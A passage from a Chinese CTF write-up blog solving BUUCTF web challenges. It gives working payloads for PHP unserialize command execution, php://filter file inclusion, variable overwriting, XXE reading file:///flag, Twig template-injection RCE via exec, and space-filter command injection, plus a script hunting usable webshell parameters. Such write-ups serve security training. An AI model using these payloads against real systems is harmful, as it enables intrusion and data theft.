class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A<span class="string">&quot;p&quot;</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A<span class="string">&quot;find+%2F+-name+flag%2A&quot;</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A<span class="string">&quot;func&quot;</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A<span class="string">&quot;system&quot;</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line">    </span><br><span class="line">/index.php?func=unserialize&amp;p=O%<span class="number">3</span>A4%<span class="number">3</span>A<span class="string">&quot;Test&quot;</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A<span class="string">&quot;p&quot;</span>%<span class="number">3</span>Bs%<span class="number">3</span>A22%<span class="number">3</span>A<span class="string">&quot;cat+%2Ftmp%2Fflagoefiu4r93&quot;</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A<span class="string">&quot;func&quot;</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A<span class="string">&quot;system&quot;</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>



## [BSidesCF 2020]Had a bad day

![image-20220510153108930](./buu/image-20220510153108930.png)

可能存在SQL注入或者文件包含，在我尝试读取index.php源码的时候出现了报错信息:`php://filter:/convert.base64-encode/resource=index.php`

![image-20220510153355995](./buu/image-20220510153355995.png)

是文件包含，但是有`index.php`却读取错误，报错显示**无法打开流：操作失败**在后面测试的时候，发现除掉后缀即可读取到源码,解码后：

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">				<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">						<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span>&#123;</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    strpos() 函数返回字符串在另一字符串中第一次出现的位置。如果存在，返回数字，如果没有找到该字符串，则返回<span class="literal">false</span>.</span><br></pre></td></tr></table></figure>

传入的`category`需要有`woofers`,`meowers`,`index`才能包含传入以传入名为文件名的文件，我们要想办法包含flag.php
 尝试直接读取`/index.php?category=woofers/../flag`

显示：![image-20220510152524515](./buu/image-20220510152524515.png)

出现了别的内容，包含成功了`flag.php`，但是这里也说了flag需要读取

如何去获取flag.php的内容呢?这里使用的知识点是php://filter伪协议套协议

`/index.php?category=php://filter/convert.base64-encode/index/resource=flag`

套一个字符`index`符合条件并且传入flag，读取flag.php

## [BJDCTF2020]Mark loves cat

进去就先扫一下dirsearch

git泄露，再用githack下载下来，有flag.php和index.php

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;   <span class="comment">//如果传入＄x=flag&amp;＄y=flag 则$flag=$flag就可以输出结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="comment">//不能同时 flag的值等于某个键名，那个键名又是flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125; <span class="comment">//不存在键名为flag的GET与POST，输出变量$yds</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//传入的POST的键名为flag，或GET的键名也为flag，值都为flag，则输出变量$is</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

index.php代码第9行和13行，根据$$和foreach可以判断可能存在变量覆盖漏洞，也就是可以将$yds，$is，$handsome的值进行覆盖成$flag变量，然后输出对应变量的值，获取flag。

解法一：exit($handsome);

函数判断到 `a=flag` 的时候， `$_GET['flag'] === $x && $x !== 'flag'` --> `a === a && a !== 'flag'` 这就进来了 `true && true` 就进来了， 然后 ``exit($handsome);`

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">($_GET[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)</span></span>&#123; <span class="comment">//不能同时  flag的值等于某个键名，那个键名又是flag, 就是 flag=a &amp;&amp; a!=flag啊，这样就能进了  ?flag=(不是flag)&amp;(不是flag)=xxx</span></span><br></pre></td></tr></table></figure>

![image-20220510235544221](./buu/image-20220510235544221.png)

因为要 ``exit($handsome);`` 那么我们要做的就是 让` `$handsome = $flag ` get` 条件的处理如下

<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach(<span class="variable">$_GET</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$</span>x = <span class="variable">$$</span>y;<span class="regexp">//</span> <span class="variable">$handsome</span> = flag的值  ---&gt;   <span class="variable">$handsome</span> = <span class="variable">$flag</span>  --&gt; <span class="variable">$x</span>=handsome &amp; <span class="variable">$y</span>=flag</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`$<span class="variable">$x</span> = $<span class="variable">$y</span>``而我们要的结果是``<span class="variable">$handsome</span> = <span class="variable">$flag</span>``那么特简单 让 ``<span class="variable">$x</span>=handsome 和 <span class="variable">$y</span>=flag``即可</span><br><span class="line"> payload1：`http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/CTF/</span>?handsome=flag&amp;flag=b&amp;b=flag`</span><br><span class="line"> payload2：`http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/CTF/</span>?handsome=flag&amp;flag=handsome</span><br></pre></td></tr></table></figure>

解法二：exit($yds);

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入这个 <span class="keyword">exit</span>语句:GET,POST 都不设置flag就进去了</span><br><span class="line">/?yds=flag</span><br></pre></td></tr></table></figure>

解法三：exit($is);

`/?is=flag&flag=flag`

## [强网杯 2019]高明的黑客

1、我们先打开题目，提示可以下载源码：

![image-20220511225851348](./buu/image-20220511225851348.png)

下载源码，打开是几千个`php`文件，而且很乱，根本没法看，不过里面包含很多`shell`

![image-20220511225919731](./buu/image-20220511225919731.png)

不过很多`shell`都没用，所以我们猜测这几千个`php`文件中肯定含有可以使用的shell，我们只有写脚本去试了。

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  							  			<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;D:/phpstudy_pro/WWW/src/&quot;</span></span><br><span class="line">os.chdir(filePath)													<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>								<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>											 <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:							<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;														<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;														<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/src/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)			<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:									<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:													<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:															<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

![image-20220511230010227](./buu/image-20220511230010227.png)

我们访问
`/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag`得到`flag`

![image-20220511230107955](./buu/image-20220511230107955.png)

## [NCTF2019]Fake XML cookbook

考查的地方：[XML](https://so.csdn.net/so/search?q=XML&spm=1001.2101.3001.7020)实体注入漏洞，远程文件读取（XXE）

[浅谈XML实体注入漏洞](https://www.freebuf.com/vuls/175451.html) 

[先知社区XXE](https://xz.aliyun.com/t/6887#toc-5)

![image-20220511234432734](./buu/image-20220511234432734.png)

抓包分析：

![image-20220511234617028](./buu/image-20220511234617028.png)

这里用的是外部实体远程文件读取那个地方的知识点，根据上面的抓包信息，我们可以知道页面以POST形式传输了XML数据，既然是XML数据，我们就可以自己新增一个恶意外部实体然后在原本的XML数据中进行实体调用，来进行XXE攻击，如下：

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span>  &lt;--可以不要&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">admin</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

![image-20220511235751488](./buu/image-20220511235751488.png)

**payload解释：**

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。</span><br><span class="line">standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</span><br><span class="line">按实体有无参分类，实体分为一般实体和参数实体，一般实体的声明：<span class="meta">&lt;!ENTITY 实体名称 <span class="meta-string">&quot;实体内容&quot;</span>&gt;</span>，引用一般实体的方法：&amp;实体名称;</span><br><span class="line">外部实体，用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机。</span><br><span class="line">因为将file:///flag命名为admin，所以下面用&amp;admin。</span><br><span class="line">PHP引用外部实体，常见的利用协议：</span><br><span class="line">file://文件绝对路径 如：file:///etc/passwd</span><br></pre></td></tr></table></figure>

## [BJDCTF2020]Cookie is so stable

![image-20220513215832915](./buu/image-20220513215832915.png)

一开始看到题目提示cookie 先抓一个包试试

![image-20220513215923652](./buu/image-20220513215923652.png)

flag..php感觉是注入的题目，但是[sql注入](https://so.csdn.net/so/search?q=sql注入&spm=1001.2101.3001.7020)没啥反应。但是你输入什么他就会回显什么

![image-20220513215942483](./buu/image-20220513215942483.png)

抓包分析hint.php，既然是hint.php，那就肯定会有线索，如下，提示我们注意看cookie

![image-20220513220028569](./buu/image-20220513220028569.png)

所以回到flag.php,先输入admin，然后登录，回显

**在登录的状态下**，刷新flag.php，进行抓包

![image-20220513220102072](./buu/image-20220513220102072.png)

**尝试&#123;&#123;7\*7&#125;&#125;, 返回49**

**尝试&#123;&#123;7\*'7'&#125;&#125;,返回49,说明是Twig模板，但是如果返回7777777，则说明是Jinia2模板**

**本题是Twig模板**

[一篇文章带你理解漏洞之SSTI漏洞/#2-Twig](https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/#2-Twig)

**payload:**

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.getFilter(<span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">payload:&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

![image-20220513220856316](./buu/image-20220513220856316.png)

发现不是在这里绕过，我们抓取一个登录的包

![image-20220513221041897](./buu/image-20220513221041897.png)

##  [WUSTCTF2020]朴实无华

考察点：三重绕过，intval()函数进行科学计数法的绕过，[md5](https://so.csdn.net/so/search?q=md5&spm=1001.2101.3001.7020)碰撞，命令执行，php绕过过滤空格

![image-20220514214755142](./buu/image-20220514214755142.png)

利用点bot，想到robots.txt网站的爬虫规则

![image-20220514215001996](./buu/image-20220514215001996.png)

flag&#123;this_is_not_flag&#125;

响应包：![image-20220514215127437](./buu/image-20220514215127437.png)

/f14g.php,得到源码：![image-20220514215304442](./buu/image-20220514215304442.png)

（1）level1

    //level 1
    if (isset($_GET['num']))&#123;
        $num = $_GET['num'];
        if(intval($num) < 2020 && intval($num + 1) > 2021)&#123;//需要$num小于2020但是+1之后大于2021
            echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.<br>";
        &#125;else&#123;
            die("金钱解决不了穷人的本质问题");
        &#125;
    &#125;else&#123;
        die("去非洲吧");
    &#125; 
**intval()** 函数用于获取变量的整数值。![image-20220514215454056](./buu/image-20220514215454056.png)

所以对字符串2e4，intval()函数只会讲其中的2给提取出来，也就是2。

我们知道php还有个强制转换的机制，如果我们将一个字符串和一个数字相加，首先php会将字符串转换成数字，然后将两个数字相加。

而2e4字符串转换成数字是浮点数20000，然后再加0就是浮点数20001，再intval将整数部分提取出来，就是(int)20001。所以可以进行绕过。
(2) level2

    //level 2
    if (isset($_GET['md5']))&#123;
       $md5=$_GET['md5'];
       if ($md5==md5($md5))     //需要找到一个字符串满足它本身和它的md5编码值弱比较相同
           echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.<br>";
       else
           die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
    &#125;else&#123;
        die("去非洲吧");
    &#125;

看到==，就想到了php弱比较，php会将以0e开头的字符串，当进行==弱比较时，会认为是相同的。php把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。

所以就变成了找到一个以0e开头的字符串s,并且md5(s)也是以0x开头的字符串。**0e215962017**


(3) get flag

    //get flag
    if (isset($_GET['get_flag']))&#123;
        $get_flag = $_GET['get_flag'];
        if(!strstr($get_flag," "))&#123;     //就是说当$get_flag中没有空格（ ）的时候，执行下面的语句 
            $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
            echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.<br>";
            system($get_flag);
        &#125;else&#123;
            die("快到非洲了");
        &#125;
    &#125;else&#123;
        die("去非洲吧");
    &#125;
    
    strstr() 函数搜索字符串在另一字符串中的第一次出现，并且返回字符串的剩余部分。如果找不到要找的字符串，则返回false.
    
    str_ireplace() 函数替换字符串中的一些字符（不区分大小写）。
**我们需要传入的$get_flag，不存在空格，并且cat也会被替代为wctf2020，然后才会执行$get_flag。**

先试试传入ls,查看目录文件![image-20220514220107738](./buu/image-20220514220107738.png)

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">payload</span>:/fl<span class="number">4</span>g.php?num=<span class="number">2</span>e<span class="number">4</span>&amp;md<span class="number">5</span>=<span class="number">0</span>e<span class="number">215962017</span>&amp;get_flag=tac<span class="variable">$&#123;IFS&#125;</span>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>

## [安洵杯 2019]easy_serialize_php

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;<span class="comment">//是一个过滤器，把符合filter_arr里面的字符替换为空（满足字符串逃逸的条件）</span></span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);<span class="comment">//把$_SESSION重置为空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);<span class="comment">//这里就用了变量覆盖的知识</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a 